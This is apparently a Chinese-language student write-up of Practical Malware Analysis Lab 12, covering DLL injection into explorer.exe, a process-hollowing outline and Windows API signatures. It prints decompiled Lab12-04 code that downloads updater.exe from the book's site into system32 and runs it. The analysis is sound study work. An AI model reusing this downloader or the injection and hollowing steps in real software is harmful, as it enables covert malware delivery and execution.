# Lab12-01
strings.exe查看 发现有个很有趣的地方 exe出现了`explorer.exe` dll 出现了 `Press OK to reboot` 以及 `Practical Malware Analysis %d`

## createRemoteThread
创建在另一个进程的虚拟地址空间中运行的线程
![image](https://img2023.cnblogs.com/blog/3092507/202312/3092507-20231201180346641-1290734425.png)


通过CreateRemoteThread在远程进程中创建一个新的线程 通过参数lab12-01.dll来调用LoadLibraryA
典型的dll注入！将lab12-01.dll注入到了explorer.exe中

# Lab12-02

```c
返回指向资源信息的块
HRSRC FindResourceA(
  HMODULE hModule,
  LPCSTR  lpName,//资源名字
  LPCSTR  lpType//资源类型
);
得到和资源联系的句柄
HGLOBAL LoadResource(
  HMODULE hModule,
  HRSRC   hResInfo
);
返回资源的第一个字节地址
LPVOID LockResource(
  HGLOBAL hResData
);
创建进程
BOOL CreateProcessA(
  LPCSTR                lpApplicationName,
  LPSTR                 lpCommandLine,
  LPSECURITY_ATTRIBUTES lpProcessAttributes,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  BOOL                  bInheritHandles,
  DWORD                 dwCreationFlags,
  LPVOID                lpEnvironment,
  LPCSTR                lpCurrentDirectory,
  LPSTARTUPINFOA        lpStartupInfo,
  LPPROCESS_INFORMATION lpProcessInformation
);
创建进程的信息结构体
typedef struct _PROCESS_INFORMATION {
  HANDLE hProcess;//进程句柄
  HANDLE hThread;//线程句柄
  DWORD  dwProcessId;//PID
  DWORD  dwThreadId;//TID
} PROCESS_INFORMATION, *PPROCESS_INFORMATION, *LPPROCESS_INFORMATION;
获得线程信息
BOOL GetThreadContext(
  HANDLE    hThread,
  LPCONTEXT lpContext//比较复杂的结构体 包含当前线程的所有寄存器信息
);
读取进程数据
BOOL ReadProcessMemory(
  HANDLE  hProcess,//进程句柄
  LPCVOID lpBaseAddress,//要读的地址
  LPVOID  lpBuffer,//保存内容地址
  SIZE_T  nSize,//大小
  SIZE_T  *lpNumberOfBytesRead
);
写进程数据
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
unmaps进程一块内存
NTSYSAPI NTSTATUS ZwUnmapViewOfSection(
  HANDLE ProcessHandle,
  PVOID  BaseAddress
);
找到ClassName的窗体
HWND FindWindowA(
  LPCSTR lpClassName,
  LPCSTR lpWindowName//如果为0，表示搜索所有
);
HHOOK SetWindowsHookExA(
  int       idHook,
  HOOKPROC  lpfn,
  HINSTANCE hmod,
  DWORD     dwThreadId
);
```

进程替换流程
```c++
1.用挂起的方式执行进程
2.ZwUnmapViewOfSection释放指向的内存，解除内存映射
3.VirtualAlloc为恶意代码分配新的内存
4.循环将恶意代码的每个段写入受害者进程的内存空间
5.恢复受害者进程的环境，SetThreadContext函数
6.ResumeThread函数恢复执行。
```

# Lab12-04
psapi.dll: 进程状态API提供用于检索以下信息的函数集
- 进程信息
- 模块信息
- 设备驱动程序信息
- 进程内存使用情况信息
- 工作集信息
- 内存映射文件信息

winlogon: Windows操作系统的一部分 提供交互式登录支持
该模型由三个部分组成
- Winlogon可执行文件
- 图形标识和身份认证DLL - GINA
- 任意数量的网络提供程序

movefile修改后 调用自身resource内的bin#101来调用winup(修改了)
(所以说 strings.exe是个好工具 IDA根本查看不到内部resource的)
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  CHAR v4[272]; // [esp+8h] [ebp-440h] BYREF
  CHAR v5[272]; // [esp+118h] [ebp-330h] BYREF
  CHAR Buffer[272]; // [esp+228h] [ebp-220h] BYREF
  CHAR CmdLine[272]; // [esp+338h] [ebp-110h] BYREF

  memset(Buffer, 0, 270);
  memset(CmdLine, 0, 270);
  memset(v5, 0, 270);
  memset(v4, 0, 270);
  GetTempPathA(0x10Eu, Buffer);
  snprintf(CmdLine, 0x10Eu, "%s%s", Buffer, aWinupExe);
  WinExec(CmdLine, 5u);
  GetWindowsDirectoryA(v5, 0x10Eu);
  snprintf(v4, 0x10Eu, "%s%s", v5, aSystem32Wupdmg);
  if ( !URLDownloadToFileA(0, aHttpWwwPractic, v4, 0, 0) )
    WinExec(v4, 0);
  return 0;
}
```

这里可以看到会访问http://www.practicalmalwareanalysis.com/updater.exe 后下载一个文件
写入v4(\system32\wupdmgrd.exe路径)并执行
本来还想下载下了看看的 貌似这网站现在已经挂了
这种思路挺巧妙的woc
